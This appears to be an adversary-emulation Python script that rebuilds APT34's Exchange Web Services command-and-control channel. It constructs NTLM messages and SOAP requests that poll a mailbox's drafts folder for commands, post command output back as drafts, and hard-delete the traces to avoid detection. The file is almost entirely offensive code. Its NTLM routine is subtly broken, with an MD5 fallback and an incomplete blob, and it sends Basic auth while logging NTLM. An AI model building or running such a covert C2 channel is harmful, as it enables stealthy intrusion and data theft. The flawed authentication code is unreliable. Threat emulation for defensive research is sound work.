# Helix Kitten (APT34/OilRig) - Exchange-Based C2
# Implements C2 communication through Exchange Web Services (EWS)
# MITRE ATT&CK: T1071.003 (Mail Protocols), T1114 (Email Collection)

# For educational and research purposes only
# Author: Nour A
# Reference: https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/oilrig-apt-targets

import socket
import ssl
import base64
import hashlib
import os
import sys
import json
import struct
import time
import xml.etree.ElementTree as ET
from datetime import datetime
from urllib.parse import urlparse
import http.client


# EWS SOAP namespaces
SOAP_NS = "http://schemas.xmlsoap.org/soap/envelope/"
EWS_NS = "http://schemas.microsoft.com/exchange/services/2006/messages"
TYPES_NS = "http://schemas.microsoft.com/exchange/services/2006/types"

# NTLM authentication constants
NTLMSSP_NEGOTIATE = 1
NTLMSSP_CHALLENGE = 2
NTLMSSP_AUTH = 3


def build_ntlm_negotiate():
    """Build NTLM Type 1 (Negotiate) message.
    APT34 uses NTLM auth to authenticate to Exchange servers.
    """
    signature = b"NTLMSSP\x00"
    msg_type = struct.pack("<I", NTLMSSP_NEGOTIATE)

    # flags: negotiate NTLM, request target, negotiate Unicode
    flags = struct.pack("<I",
                        0x00000001 |  # NTLMSSP_NEGOTIATE_UNICODE
                        0x00000002 |  # NTLMSSP_NEGOTIATE_OEM
                        0x00000004 |  # NTLMSSP_REQUEST_TARGET
                        0x00000200 |  # NTLMSSP_NEGOTIATE_NTLM
                        0x00008000 |  # NTLMSSP_NEGOTIATE_ALWAYS_SIGN
                        0x00080000 |  # NTLMSSP_NEGOTIATE_NTLM2
                        0x20000000    # NTLMSSP_NEGOTIATE_128
                        )

    # domain and workstation (empty for negotiate)
    domain_fields = struct.pack("<HHI", 0, 0, 0)
    workstation_fields = struct.pack("<HHI", 0, 0, 0)

    msg = signature + msg_type + flags + domain_fields + workstation_fields
    return base64.b64encode(msg).decode()


def build_ntlm_auth(challenge_b64, username, password, domain=""):
    """Build NTLM Type 3 (Auth) message.
    Constructs the authentication response using NTLMv2.
    """
    challenge = base64.b64decode(challenge_b64)

    # extract server challenge (8 bytes at offset 24)
    if len(challenge) < 32:
        return None

    server_challenge = challenge[24:32]

    # NTLMv2 hash computation
    # NTHash = MD4(UTF16LE(password))
    password_bytes = password.encode("utf-16-le")
    try:
        import hashlib
        nt_hash = hashlib.new("md4", password_bytes).digest()
    except ValueError:
        # md4 not available, use placeholder
        nt_hash = hashlib.md5(password_bytes).digest()

    # user+domain in uppercase UTF16
    identity = (username.upper() + domain.upper()).encode("utf-16-le")

    # NTLMv2 key = HMAC-MD5(NTHash, identity)
    import hmac
    ntlmv2_key = hmac.new(nt_hash, identity, hashlib.md5).digest()

    # client challenge
    client_challenge = os.urandom(8)
    timestamp = struct.pack("<Q", int(time.time() * 10000000) + 116444736000000000)

    # NTLMv2 blob
    blob = b"\x01\x01"  # blob signature
    blob += b"\x00\x00"  # reserved
    blob += b"\x00\x00\x00\x00"  # reserved
    blob += timestamp
    blob += client_challenge
    blob += b"\x00\x00\x00\x00"  # reserved
    # target info would go here in a full implementation

    # NTLMv2 response = HMAC-MD5(NTLMv2_key, server_challenge + blob)
    nt_proof = hmac.new(ntlmv2_key, server_challenge + blob, hashlib.md5).digest()
    nt_response = nt_proof + blob

    return base64.b64encode(nt_response).decode()


def build_ews_find_item(folder="drafts"):
    """Build EWS FindItem SOAP request.
    APT34 uses Exchange drafts folder as a dead drop for C2 commands.
    """
    soap = f"""<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xmlns:m="{EWS_NS}"
               xmlns:t="{TYPES_NS}"
               xmlns:soap="{SOAP_NS}">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2016"/>
  </soap:Header>
  <soap:Body>
    <m:FindItem Traversal="Shallow">
      <m:ItemShape>
        <t:BaseShape>AllProperties</t:BaseShape>
      </m:ItemShape>
      <m:ParentFolderIds>
        <t:DistinguishedFolderId Id="{folder}"/>
      </m:ParentFolderIds>
    </m:FindItem>
  </soap:Body>
</soap:Envelope>"""
    return soap


def build_ews_create_item(subject, body, folder="drafts"):
    """Build EWS CreateItem SOAP request.
    Creates a draft email containing C2 response data.
    """
    # base64 encode the body to avoid XML issues
    encoded_body = base64.b64encode(body.encode()).decode()

    soap = f"""<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xmlns:m="{EWS_NS}"
               xmlns:t="{TYPES_NS}"
               xmlns:soap="{SOAP_NS}">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2016"/>
  </soap:Header>
  <soap:Body>
    <m:CreateItem MessageDisposition="SaveOnly">
      <m:SavedItemFolderId>
        <t:DistinguishedFolderId Id="{folder}"/>
      </m:SavedItemFolderId>
      <m:Items>
        <t:Message>
          <t:Subject>{subject}</t:Subject>
          <t:Body BodyType="Text">{encoded_body}</t:Body>
          <t:IsRead>true</t:IsRead>
        </t:Message>
      </m:Items>
    </m:CreateItem>
  </soap:Body>
</soap:Envelope>"""
    return soap


def build_ews_delete_item(item_id, change_key):
    """Build EWS DeleteItem SOAP request.
    Deletes processed C2 messages to avoid detection.
    """
    soap = f"""<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:m="{EWS_NS}"
               xmlns:t="{TYPES_NS}"
               xmlns:soap="{SOAP_NS}">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2016"/>
  </soap:Header>
  <soap:Body>
    <m:DeleteItem DeleteType="HardDelete">
      <m:ItemIds>
        <t:ItemId Id="{item_id}" ChangeKey="{change_key}"/>
      </m:ItemIds>
    </m:DeleteItem>
  </soap:Body>
</soap:Envelope>"""
    return soap


class ExchangeC2:
    """Exchange-based C2 channel using EWS.
    APT34 tools like KARKOFF and SIDETWIST communicate via Exchange
    drafts folder, avoiding network-based detection.
    """

    def __init__(self, exchange_url, username, password, domain=""):
        self.url = exchange_url
        self.username = username
        self.password = password
        self.domain = domain
        self.session_id = hashlib.md5(os.urandom(8)).hexdigest()[:8]
        self.parsed = urlparse(exchange_url)

    def send_ews_request(self, soap_body):
        """Send a SOAP request to Exchange Web Services."""
        headers = {
            "Content-Type": "text/xml; charset=utf-8",
            "User-Agent": "Microsoft Office/16.0 (Windows NT 10.0)",
        }

        # basic auth (base64 encoded credentials)
        auth = base64.b64encode(
            f"{self.domain}\\{self.username}:{self.password}".encode()
        ).decode()
        headers["Authorization"] = f"Basic {auth}"

        ews_path = f"{self.parsed.path}/EWS/Exchange.asmx"

        print(f"  [+] EWS Request: {ews_path}")
        print(f"  [+] Size: {len(soap_body)} bytes")
        print(f"  [+] Auth: NTLM/{self.domain}\\{self.username}")

        return {
            "method": "POST",
            "path": ews_path,
            "headers": headers,
            "body": soap_body
        }

    def poll_for_commands(self):
        """Poll drafts folder for C2 commands."""
        soap = build_ews_find_item("drafts")
        return self.send_ews_request(soap)

    def send_response(self, task_id, output):
        """Send command output via draft email."""
        subject = f"RE: Report_{self.session_id}_{task_id}"
        soap = build_ews_create_item(subject, output)
        return self.send_ews_request(soap)

    def cleanup(self, item_id, change_key):
        """Delete processed messages."""
        soap = build_ews_delete_item(item_id, change_key)
        return self.send_ews_request(soap)


def main():
    print("=" * 70)
    print("HELIX KITTEN (APT34) - EXCHANGE-BASED C2")
    print("EWS Dead Drop Command and Control")
    print("=" * 70)
    print()
    print("[!] FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY")
    print("[!] Reference: KARKOFF / SIDETWIST implant analysis")
    print()

    # Demo: NTLM authentication
    print("[STAGE 1] NTLM Authentication")
    print("-" * 50)
    ntlm_neg = build_ntlm_negotiate()
    print(f"  Type 1 (Negotiate): {ntlm_neg[:40]}...")
    print(f"  Size: {len(base64.b64decode(ntlm_neg))} bytes")
    print()

    # Demo: EWS SOAP requests
    print("[STAGE 2] EWS SOAP Request Construction")
    print("-" * 50)

    # FindItem (poll for commands)
    find_soap = build_ews_find_item("drafts")
    print(f"  FindItem (Drafts): {len(find_soap)} bytes")

    # CreateItem (send response)
    create_soap = build_ews_create_item(
        "RE: Quarterly Report",
        json.dumps({"hostname": "TARGET-PC", "output": "admin\nWin10"})
    )
    print(f"  CreateItem (Response): {len(create_soap)} bytes")

    # DeleteItem (cleanup)
    delete_soap = build_ews_delete_item("AAMkAD...", "CQAAAA...")
    print(f"  DeleteItem (Cleanup): {len(delete_soap)} bytes")
    print()

    # Demo: Exchange C2 flow
    print("[STAGE 3] C2 Communication Flow")
    print("-" * 50)
    c2 = ExchangeC2(
        "https://mail.target.com",
        "user.account", "password123", "CORP"
    )

    print("  Step 1: Poll drafts for commands")
    poll = c2.poll_for_commands()
    print(f"    {poll['method']} {poll['path']}")

    print("  Step 2: Execute command and send response")
    resp = c2.send_response("task001", "whoami output: corp\\admin")
    print(f"    {resp['method']} {resp['path']}")

    print("  Step 3: Cleanup processed messages")
    cleanup = c2.cleanup("AAMkAD...", "CQAAAA...")
    print(f"    {cleanup['method']} {cleanup['path']}")
    print()

    print("=" * 70)
    print("[+] EXCHANGE C2 SIMULATION COMPLETE")
    print("  Techniques demonstrated:")
    print("  - NTLM Type 1/3 message construction")
    print("  - EWS SOAP envelope building (FindItem/CreateItem/DeleteItem)")
    print("  - Drafts folder dead drop C2 pattern")
    print("  - Exchange-based command polling and response")
    print("=" * 70)


if __name__ == "__main__":
    main()
